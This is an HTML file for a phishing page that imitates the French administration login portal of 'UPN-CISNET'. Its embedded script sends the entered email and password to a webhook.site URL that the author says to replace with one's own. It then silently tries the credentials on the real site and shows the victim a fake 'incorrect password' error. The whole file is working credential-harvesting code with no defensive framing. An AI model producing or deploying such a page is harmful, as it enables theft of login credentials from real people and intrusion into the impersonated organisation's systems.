<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UPN-CISNET | Connexion Administration</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            font-family: system-ui, sans-serif;
        }
        .login-box {
            background: white; border-radius: 12px; padding: 40px;
            width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center; margin-bottom: 30px;
        }
        .logo h2 { color: #0f3460; font-weight: 700; font-size: 22px; }
        .logo p { color: #666; font-size: 13px; margin-top: 5px; }
        .form-control {
            border: 1px solid #ddd; padding: 12px 15px; border-radius: 8px;
            font-size: 14px; transition: all 0.3s;
        }
        .form-control:focus {
            border-color: #0f3460; box-shadow: 0 0 0 3px rgba(15,52,96,0.1);
        }
        .btn-login {
            background: #0f3460; color: white; border: none;
            padding: 12px; border-radius: 8px; width: 100%;
            font-size: 16px; font-weight: 600; cursor: pointer;
            transition: all 0.3s;
        }
        .btn-login:hover { background: #1a1a2e; transform: translateY(-1px); }
        .forgot { text-align: center; margin-top: 15px; }
        .forgot a { color: #0f3460; text-decoration: none; font-size: 13px; }
        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 10px; text-align: center; display: none; }
        .footer-text { text-align: center; margin-top: 20px; color: #999; font-size: 11px; }
        .spinner { display: none; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>

<div class="login-box">
    <div class="logo">
        <h2>ðŸ” UPN-CISNET</h2>
        <p>Portail d'Administration â€” Acces securise</p>
    </div>

    <form id="loginForm">
        <div class="mb-3">
            <label class="form-label fw-semibold">Adresse Email</label>
            <input type="email" name="email" class="form-control" placeholder="admin@upn-cisnet.com" required autofocus>
        </div>
        <div class="mb-3">
            <label class="form-label fw-semibold">Mot de passe</label>
            <input type="password" name="password" class="form-control" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" required>
        </div>
        <button type="submit" class="btn-login">Se connecter</button>
    </form>

    <div class="error-msg" id="errorMsg">Email ou mot de passe incorrect.</div>
    <div class="spinner" id="spinner">
        <div class="spinner-border spinner-border-sm text-primary"></div> Verification...
    </div>

    <div class="forgot">
        <a href="#">Mot de passe oublie ?</a>
    </div>
    <div class="footer-text">
        UPN-CISNET Â© 2026 â€” Tous droits reserves<br>
        Version 3.2.1 | Session securisee SSL
    </div>
</div>

<script>
// ===== CONFIGURATION =====
// Remplace par ton URL webhook.site
const WEBHOOK = "https://webhook.site/0878f5bf-8194-4c17-b40d-c363e1169c00";

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = this.querySelector('[name="email"]').value.trim();
    const password = this.querySelector('[name="password"]').value.trim();
    
    if (!email || !password) return;
    
    // Show spinner
    document.getElementById('spinner').style.display = 'block';
    document.getElementById('errorMsg').style.display = 'none';
    
    // 1. Send credentials to webhook
    try {
        await fetch(WEBHOOK + '?email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(password), {
            mode: 'no-cors'
        });
    } catch(ex) {}
    
    // 2. Also try to login to real site (opacity)
    try {
        const tokenResp = await fetch('https://upn-cisnet.com/login');
        const html = await tokenResp.text();
        const tokenMatch = html.match(/name="_token" value="([^"]+)"/);
        if (tokenMatch) {
            const formData = new URLSearchParams();
            formData.append('_token', tokenMatch[1]);
            formData.append('email', email);
            formData.append('password', password);
            await fetch('https://upn-cisnet.com/login', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            });
        }
    } catch(ex) {}
    
    // 3. Show "error" to victim
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('errorMsg').style.display = 'block';
    document.getElementById('errorMsg').textContent = 'Email ou mot de passe incorrect. Veuillez reessayer.';
    
    // Clear password
    this.querySelector('[name="password"]').value = '';
});
</script>
</body>
</html>
